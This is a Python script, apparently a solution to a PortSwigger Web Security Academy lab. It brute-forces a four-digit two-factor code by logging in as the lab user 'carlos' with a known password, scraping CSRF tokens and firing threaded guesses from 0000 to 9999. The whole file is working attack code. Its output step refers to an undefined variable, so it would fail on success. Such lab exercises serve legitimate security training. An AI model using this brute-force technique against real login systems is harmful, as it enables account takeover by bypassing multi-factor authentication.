#!/usr/bin/env python3

import requests
from threading import Thread
from time import sleep
from bs4 import BeautifulSoup
import random

def sendRequest(url, number):
    # Display current number and use \r to clear previous line
    print(f'[*] Trying number: {number}', end='\r')

    session = requests.Session()

    # Get login CSRF token
    login1Request = session.get(url + '/login')
    soup = BeautifulSoup(login1Request.text, 'html.parser')
    login1CsrfToken = soup.find('input', {'name': 'csrf'}).get('value')

    login1Data = {
        'csrf': login1CsrfToken,
        'username': 'carlos',
        'password': 'montoya'
    }
    
    # Login as user carlos
    login1RequestResponse = session.post(url + '/login', data=login1Data)

    # Get 2FA page CSRF token
    login2Request = session.get(url + '/login2')
    soup = BeautifulSoup(login2Request.text, 'html.parser')
    login2CsrfToken = soup.find('input', {'name': 'csrf'}).get('value')

    login2Data = {
        'csrf': login2CsrfToken,
        'mfa-code': number
    }

    # Enter 2FA code
    result = session.post(url + '/login2', data=login2Data)

    if 'Incorrect security code' not in result.text:
        print(f'[+] Found security code: {number}')
        with open('outX.txt', 'w') as f:
            print(f'[+] Found security code: {number}', filename, file=f)

def main():
    url = 'https://0afb00d10459e1b781dbac46009400a1.web-security-academy.net'

    # Generate number 0000 to 9999 into a list
    listNumbers = [f'{i:04d}' for i in range(10000)]
    random.shuffle(listNumbers)

    for number in listNumbers:
        thread = Thread(target=sendRequest, args=(url, number))
        thread.start()

        # You can adjust how fast of each connection. 0.2s is recommended.
        sleep(0.5)

if __name__ == '__main__':
    main()